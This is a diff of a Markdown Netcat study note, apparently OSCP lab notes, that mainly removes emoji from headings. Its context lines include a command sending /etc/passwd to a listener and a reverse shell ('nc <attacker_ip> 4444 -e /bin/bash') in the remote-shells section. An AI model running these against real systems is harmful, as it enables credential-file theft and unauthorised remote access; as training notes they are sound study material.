@@ -1,11 +1,11 @@
-#nc #tools
-## 🛠️ Netcat (nc)
+ #tools
+##  Netcat (nc)
 
 Netcat is a versatile networking tool used for reading from and writing to network connections using TCP or UDP.
 
 ---
 
-### 📘 Basic Concepts
+###  Basic Concepts
 
 - **Protocol**: Defines how devices communicate (e.g., TCP/UDP).
     
@@ -24,7 +24,7 @@ Netcat is a versatile networking tool used for reading from and writing to netwo
 
 ---
 
-### 🧪 Basic Netcat Communication
+###  Basic Netcat Communication
 
 #### Listener Side (Metasploitable):
 
@@ -45,11 +45,11 @@ nc <IP_of_meta> <port>
 nc 192.168.1.4 4444
 ```
 
-➡️ After running the above commands, anything typed on one side will appear on the other.
+ After running the above commands, anything typed on one side will appear on the other.
 
 ---
 
-### 🔍 Verbose Mode
+###  Verbose Mode
 
 ```bash
 # Listener:
@@ -66,7 +66,7 @@ nc 192.168.1.4 4444 -v
 
 ---
 
-### 🌍 Connecting to Web Services
+###  Connecting to Web Services
 
 ```bash
 nc -v google.com 80
@@ -81,7 +81,7 @@ nc -v -n 142.250.200.238 80
 
 ---
 
-### 🧾 Using /etc/hosts for Custom Hostnames
+###  Using /etc/hosts for Custom Hostnames
 
 ```bash
 sudo nano /etc/hosts
@@ -101,7 +101,7 @@ nc -v meta.net 4444
 
 ---
 
-### 📤 File Transfer Using Netcat
+###  File Transfer Using Netcat
 
 ```bash
 # On the receiver:
@@ -111,7 +111,7 @@ nc -nlvp 4444 > received.txt
 nc -nv <target_ip> 4444 < /etc/passwd
 ```
 
-📌 Tip:  
+ Tip:  
 To monitor file arrival in real-time on Kali:
 
 ```bash
@@ -120,9 +120,9 @@ watch -n 0.5 -d ls -la
 
 ---
 
-## 🖥️ Remote Shells Using Netcat
+##  Remote Shells Using Netcat
 
-### 🔗 1. Bind Shell
+###  1. Bind Shell
 
 - Attacker connects to a victim that is **listening** with a shell.
     
@@ -143,7 +143,7 @@ nc <victim_ip> 4444
 
 ---
 
-### 🔁 2. Reverse Shell
+###  2. Reverse Shell
 
 - Victim connects back to the attacker.
     
@@ -164,13 +164,13 @@ nc <attacker_ip> 4444 -e /bin/bash
 
 ---
 
-## 🔄 Netcat Relay
+##  Netcat Relay
 
 Advanced Netcat usage — acting as a relay or proxy between systems. This is used in pivoting and advanced exploitation techniques (covered later in OSCP).
 
 ---
 
-### ✅ Summary Cheat Sheet
+### Summary Cheat Sheet
 
 ```bash
 # Basic listener
